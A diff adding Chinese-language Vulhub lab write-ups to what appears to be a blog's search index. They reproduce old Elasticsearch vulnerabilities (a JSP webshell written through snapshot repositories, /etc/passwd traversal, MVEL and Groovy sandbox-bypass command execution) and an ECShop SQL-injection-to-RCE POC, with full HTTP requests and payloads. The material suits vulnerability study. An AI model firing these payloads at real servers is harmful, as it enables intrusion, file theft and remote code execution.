@@ -17,6 +17,210 @@
       </tags>
   </entry>
   <entry>
+    <title>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</title>
+    <url>/2021/07/19/Elasticsearch%E5%86%99%E5%85%A5webshell%E6%BC%8F%E6%B4%9E%EF%BC%88WooYun-2015-110216%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"><a href="#Elasticsearch写入webshell漏洞（WooYun-2015-110216）" class="headerlink" title="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"></a>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</h1><p>参考文章： <a href="http://cb.drops.wiki/bugs/wooyun-2015-0110216.html" target="_blank" rel="noopener">http://cb.drops.wiki/bugs/wooyun-2015-0110216.html</a></p>
+<p>ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。</p>
+<p>所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。</p>
+<a id="more"></a>
+
+<p>和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项<code>path.repo</code>中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>简单介绍一下本测试环境。本测试环境同时运行了Tomcat和ElasticSearch，Tomcat目录在<code>/usr/local/tomcat</code>，web目录是<code>/usr/local/tomcat/webapps</code>；ElasticSearch目录在<code>/usr/share/elasticsearch</code>。</p>
+<p>我们的目标就是利用ElasticSearch，在<code>/usr/local/tomcat/webapps</code>目录下写入我们的webshell。</p>
+<p>首先创建一个恶意索引文档：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -XPOST http:&#x2F;&#x2F;192.168.44.132:9200&#x2F;yz.jsp&#x2F;yz.jsp&#x2F;1 -d&#39;</span><br><span class="line">&#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;</span><br><span class="line">&#39;</span><br></pre></td></tr></table></figure>
+
+<p>再创建一个恶意的存储库，其中<code>location</code>的值即为我要写入的路径。</p>
+<blockquote>
+<p>这个Repositories的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了tomcat的web部署目录，因为只要在这个文件夹创建目录Tomcat就会自动创建一个新的应用(文件名为wwwroot的话创建出来的应用名称就是wwwroot了)。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -XPUT &#39;http:&#x2F;&#x2F;192.168.44.132:9200&#x2F;_snapshot&#x2F;yz.jsp&#39; -d &#39;&#123;</span><br><span class="line">     &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">     &quot;settings&quot;: &#123;</span><br><span class="line">          &quot;location&quot;: &quot;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;wwwroot&#x2F;&quot;,</span><br><span class="line">          &quot;compress&quot;: false</span><br><span class="line">     &#125;</span><br><span class="line">&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>存储库验证并创建:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -XPUT &quot;http:&#x2F;&#x2F;192.168.44.132:9200&#x2F;_snapshot&#x2F;yz.jsp&#x2F;yz.jsp&quot; -d &#39;&#123;</span><br><span class="line">     &quot;indices&quot;: &quot;yz.jsp&quot;,</span><br><span class="line">     &quot;ignore_unavailable&quot;: &quot;true&quot;,</span><br><span class="line">     &quot;include_global_state&quot;: false</span><br><span class="line">&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210719/16266961915308.png" alt="image-20210719173202043"></p>
+<p>完成！</p>
+<p>访问<code>http://192.168.44.132:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp</code>，这就是我们写入的webshell。</p>
+<p>该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：<code>http://192.168.44.132:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success</code>，</p>
+<p><img src="https://image.3001.net/images/20210719/16266961944637.png" alt="image-20210719173244494"></p>
+<p>我们再访问/wwwroot/test.jsp就能看到success了：</p>
+<p><img src="https://image.3001.net/images/20210719/16266961979872.png" alt="image-20210719173250395"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>ElasticSearch</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ElasticSearch 目录穿越漏洞（CVE-2015-5531）</title>
+    <url>/2021/07/18/ElasticSearch%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5531%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="ElasticSearch-目录穿越漏洞（CVE-2015-5531）"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-5531）" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-5531）"></a>ElasticSearch 目录穿越漏洞（CVE-2015-5531）</h1><p>jre版本：openjdk:8-jre</p>
+<p>elasticsearch版本：v1.6.0</p>
+<p>影响版本：1.6.1以下</p>
+<a id="more"></a>
+
+<p>参考文章</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/38383/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/38383/</a></li>
+<li><a href="http://www.freebuf.com/vuls/99942.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/99942.html</a></li>
+</ul>
+<p>说明：</p>
+<p>elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件elasticsearch.yml中必须存在<code>path.repo</code>，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1-新建一个仓库"><a href="#1-新建一个仓库" class="headerlink" title="1. 新建一个仓库"></a>1. 新建一个仓库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;_snapshot&#x2F;test HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:9200</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;location&quot;: &quot;&#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;repo&#x2F;test&quot; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210719/16266961257780.png" alt="image-20210719171725382"></p>
+<h3 id="2-创建一个快照"><a href="#2-创建一个快照" class="headerlink" title="2. 创建一个快照"></a>2. 创建一个快照</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;_snapshot&#x2F;test2 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:9200</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;location&quot;: &quot;&#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;repo&#x2F;test&#x2F;snapshot-backdata&quot; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210719/16266961319916.png" alt="image-20210719171813577"></p>
+<h3 id="3-目录穿越读取任意文件"><a href="#3-目录穿越读取任意文件" class="headerlink" title="3. 目录穿越读取任意文件"></a>3. 目录穿越读取任意文件</h3><p>访问 <code>http://192.168.44.132:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code></p>
+<p><img src="https://image.3001.net/images/20210719/16266961342287.png" alt="image-20210719172114250"></p>
+<p>如上图，在错误信息中包含文件内容（ascii编码后），对其进行解码即可获得文件：</p>
+<p><img src="https://image.3001.net/images/20210719/16266961373895.png" alt="image-20210719172514340"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>ElasticSearch</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ElasticSearch 命令执行漏洞（CVE-2014-3120）</title>
+    <url>/2021/07/17/ElasticSearch%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-3120%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="ElasticSearch-命令执行漏洞（CVE-2014-3120）"><a href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）" class="headerlink" title="ElasticSearch 命令执行漏洞（CVE-2014-3120）"></a>ElasticSearch 命令执行漏洞（CVE-2014-3120）</h1><p>jre版本：openjdk:8-jre</p>
+<p>elasticsearch版本：v1.1.1</p>
+<p>相关文档：<a href="http://bouk.co/blog/elasticsearch-rce/" target="_blank" rel="noopener">http://bouk.co/blog/elasticsearch-rce/</a> 、 <a href="https://www.t00ls.net/viewthread.php?tid=29408" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=29408</a></p>
+<p>老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。</p>
+<a id="more"></a>
+
+<p>MVEL执行命令的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">new java.util.Scanner(Runtime.getRuntime().exec(&quot;id&quot;).getInputStream()).useDelimiter(&quot;\\A&quot;).next();</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>将Java代码放入json中：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">"query"</span>: &#123;</span><br><span class="line">      <span class="attr">"filtered"</span>: &#123;</span><br><span class="line">        <span class="attr">"query"</span>: &#123;</span><br><span class="line">          <span class="attr">"match_all"</span>: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"script_fields"</span>: &#123;</span><br><span class="line">        <span class="attr">"command"</span>: &#123;</span><br><span class="line">            <span class="attr">"script"</span>: <span class="string">"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;website&#x2F;blog&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:9200</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;phithon&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后，执行任意代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;_search?pretty HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:9200</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 343</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;size&quot;: 1,</span><br><span class="line">    &quot;query&quot;: &#123;</span><br><span class="line">      &quot;filtered&quot;: &#123;</span><br><span class="line">        &quot;query&quot;: &#123;</span><br><span class="line">          &quot;match_all&quot;: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;script_fields&quot;: &#123;</span><br><span class="line">        &quot;command&quot;: &#123;</span><br><span class="line">            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果如图：</p>
+<p><img src="https://image.3001.net/images/20210719/16266960644920.png" alt="image-20210719104741517"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>ElasticSearch</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ElasticSearch 目录穿越漏洞（CVE-2015-3337）</title>
+    <url>/2021/07/16/ElasticSearch%20%E6%8F%92%E4%BB%B6%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-3337%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="ElasticSearch-目录穿越漏洞（CVE-2015-3337）"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-3337）" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-3337）"></a>ElasticSearch 目录穿越漏洞（CVE-2015-3337）</h1><p>jre版本：openjdk:8-jre</p>
+<p>elasticsearch版本：v1.4.4</p>
+<p>影响版本：1.4.5以下/1.5.2以下</p>
+<p>在安装了具有“site”功能的插件以后，插件目录使用<code>../</code>即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>测试环境默认安装了一个插件：<code>elasticsearch-head</code>，主页在此：<a href="https://github.com/mobz/elasticsearch-head" target="_blank" rel="noopener">https://github.com/mobz/elasticsearch-head</a></p>
+<p>head插件提供了elasticsearch的前端页面，访问 <code>http://your-ip:9200/_plugin/head/</code> 即可看到</p>
+<p><img src="https://image.3001.net/images/20210719/16266960158663.png" alt="image-20210719170218421"></p>
+<p>访问<code>http://192.168.44.132:9200/_plugin/head/../../../../../../../../../etc/passwd</code>读取任意文件（不要在浏览器访问）：</p>
+<p><img src="https://image.3001.net/images/20210719/16266960186751.png" alt="image-20210719170653379"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>ElasticSearch</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</title>
+    <url>/2021/07/16/ElasticSearch%20Groovy%20%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87%20&amp;&amp;%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-1427%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）"><a href="#ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）" class="headerlink" title="ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）"></a>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</h1><p>jre版本：openjdk:8-jre</p>
+<p>elasticsearch版本：v1.4.2</p>
+<a id="more"></a>
+
+<p>参考文章：</p>
+<ul>
+<li><a href="http://cb.drops.wiki/drops/papers-5107.html" target="_blank" rel="noopener">http://cb.drops.wiki/drops/papers-5107.html</a></li>
+<li><a href="http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/" target="_blank" rel="noopener">http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/</a></li>
+<li><a href="https://github.com/XiphosResearch/exploits" target="_blank" rel="noopener">https://github.com/XiphosResearch/exploits</a></li>
+<li><a href="http://cb.drops.wiki/drops/papers-5142.html" target="_blank" rel="noopener">http://cb.drops.wiki/drops/papers-5142.html</a></li>
+</ul>
+<p>CVE-2014-3120后，ElasticSearch默认的动态脚本语言换成了Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。本漏洞：1.是一个沙盒绕过； 2.是一个Goovy代码执行漏洞。</p>
+<h2 id="Groovy语言“沙盒”"><a href="#Groovy语言“沙盒”" class="headerlink" title="Groovy语言“沙盒”"></a>Groovy语言“沙盒”</h2><p>ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法：</p>
+<ol>
+<li>既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射</li>
+<li>Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言</li>
+</ol>
+<p>所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。</p>
+<p>Java沙盒绕过法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.Math.class.forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;id&quot;).getText()</span><br></pre></td></tr></table></figure>
+
+<p>Goovy直接执行命令法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def command&#x3D;&#39;id&#39;;def res&#x3D;command.execute().text;res</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;website&#x2F;blog&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:9200</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后发送包含payload的数据包，执行任意命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;_search?pretty HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:9200</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;text</span><br><span class="line">Content-Length: 156</span><br><span class="line"></span><br><span class="line">&#123;&quot;size&quot;:1, &quot;script_fields&quot;: &#123;&quot;lupin&quot;:&#123;&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果如图所示：</p>
+<p><img src="https://image.3001.net/images/20210719/16266959541435.png" alt="image-20210719105426920"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>ElasticSearch</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ECShop 2.x/3.x SQL注入/远程代码执行漏洞</title>
+    <url>/2021/07/15/ECShop%202.x3.x%20SQL%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="ECShop-2-x-3-x-SQL注入-远程代码执行漏洞"><a href="#ECShop-2-x-3-x-SQL注入-远程代码执行漏洞" class="headerlink" title="ECShop 2.x/3.x SQL注入/远程代码执行漏洞"></a>ECShop 2.x/3.x SQL注入/远程代码执行漏洞</h1><p>ECShop是一个B2C独立开店系统，供企业和个人快速搭建个性化网店。本系统是一个基于PHP语言和MYSQL数据库架构的跨平台开源程序。</p>
+<p>2017年及之前的版本存在SQL注入漏洞，可以注入payload并最终导致代码执行漏洞。最新版本3.6.0已修复该漏洞，vulhub使用其最新版本2.7.3和3.6.0非最新版本重现该漏洞。</p>
+<a id="more"></a>
+
+<p>参考链接：</p>
+<ul>
+<li><a href="https://paper.seebug.org/691/" target="_blank" rel="noopener">https://paper.seebug.org/691/</a></li>
+</ul>
+<p>环境启动后，访问<code>http://192.168.44.132:8080</code>，您将看到 2.7.3 安装页面。访问<code>http://192.168.44.132:8081</code>，您将看到 3.6.0 安装页面。</p>
+<p>两个都安装，mysql地址是<code>mysql</code>，mysql账号和密码是<code>root</code>，数据库名随便填，但是2.7.3和3.6.0的数据库名不能一样。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>可以为 2.x 和 3.x 生成 POC：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$shell = bin2hex(<span class="string">"&#123;\$asd'];phpinfo\t();//&#125;xxx"</span>);</span><br><span class="line">$id = <span class="string">"-1' UNION/*"</span>;</span><br><span class="line">$arr = [</span><br><span class="line">    <span class="string">"num"</span> =&gt; sprintf(<span class="string">'*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -'</span>, bin2hex($id), $shell),</span><br><span class="line">    <span class="string">"id"</span> =&gt; $id</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$s = serialize($arr);</span><br><span class="line"></span><br><span class="line">$hash3 = <span class="string">'45ea207d7a2b68c49582d2d22adf953a'</span>;</span><br><span class="line">$hash2 = <span class="string">'554fcae493e564ee0dc75bdf2ebf94ca'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"POC for ECShop 2.x: \n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123;$hash2&#125;ads|&#123;$s&#125;&#123;$hash2&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n\nPOC for ECShop 3.x: \n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&#123;$hash3&#125;ads|&#123;$s&#125;&#123;$hash3&#125;"</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210719/16266616799111.png" alt="image-20210719095624334"></p>
+<p>将 POC 放在 HTTP-Referer 中：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;user.php?act&#x3D;login HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Cookie: PHPSESSID&#x3D;9odrkfn7munb3vfksdhldob2d0; ECS_ID&#x3D;1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]&#x3D;1</span><br><span class="line">Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*&#x2F;SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#39; UNION&#x2F;*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>2.X 的结果：</p>
+<p><img src="https://image.3001.net/images/20210719/16266616837974.png" alt="image-20210719101439684">3.X 的结果：</p>
+<p><img src="https://image.3001.net/images/20210719/16266616856749.png" alt="image-20210719101550223"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>ECShop</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Drupal &lt; 7.32 &quot;Drupalgeddon&quot; SQL 注入漏洞 (CVE-2014-3704)</title>
     <url>/2021/07/14/Drupal%E3%80%8A7.32%20Drupalgeddon%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20(CVE-2014-3704)/</url>
     <content><![CDATA[<h1 id="Drupal-lt-7-32-“Drupalgeddon”-SQL-注入漏洞-CVE-2014-3704"><a href="#Drupal-lt-7-32-“Drupalgeddon”-SQL-注入漏洞-CVE-2014-3704" class="headerlink" title="Drupal &lt; 7.32 “Drupalgeddon” SQL 注入漏洞 (CVE-2014-3704)"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL 注入漏洞 (CVE-2014-3704)</h1><p>Drupal 是一个免费的开源 Web 内容管理框架，用 PHP 编写并在 GNU 通用公共许可证下分发。</p>
